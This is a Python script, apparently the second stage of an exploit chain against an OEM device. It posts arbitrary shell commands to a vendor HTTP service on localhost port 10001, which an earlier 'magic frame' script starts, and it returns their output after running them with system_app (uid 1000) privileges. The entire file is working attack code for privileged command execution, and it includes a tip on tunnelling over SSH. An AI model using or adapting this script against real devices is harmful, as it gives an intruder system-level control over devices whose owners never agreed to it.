#!/usr/bin/env python3
"""
01_run_cmd.py — command execution as uid 1000 (system_app).

Talks to the OEM HTTP server started by 00_magic_frame.py. Request/response model
(HttpServer's `MessageModel`):

    {"dictData": {"shellCmd": "<sh -c command>", "requestRst": "true"},
     "isOK": true, "processID": 0}

POST /RunCmd  ->  {"dictData": {"shellCmdRst": "<stdout+stderr>"}, "isOK": true, ...}

Usage:
    python3 01_run_cmd.py 'id'
    python3 01_run_cmd.py -f script.sh
Environment:
    RUNCMD_URL   default http://127.0.0.1:10001/RunCmd
                  (use an SSH -L tunnel if you run this from a workstation)
"""
import json
import os
import sys
import urllib.error
import urllib.request

URL = os.environ.get("RUNCMD_URL", "http://127.0.0.1:10001/RunCmd")


def run_cmd(cmd: str, timeout: int = 300) -> str:
    payload = json.dumps({"dictData": {"shellCmd": cmd, "requestRst": "true"}}).encode()
    req = urllib.request.Request(URL, data=payload,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        body = json.loads(resp.read().decode("utf-8", "replace"))
    if not body.get("isOK"):
        raise RuntimeError(f"server error: {body}")
    return body["dictData"].get("shellCmdRst", "")


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    cmd = open(sys.argv[2]).read() if sys.argv[1] == "-f" else sys.argv[1]
    try:
        sys.stdout.write(run_cmd(cmd))
    except urllib.error.URLError as e:
        print(f"[-] cannot reach {URL}: {e}", file=sys.stderr)
        print("    run 00_magic_frame.py first", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
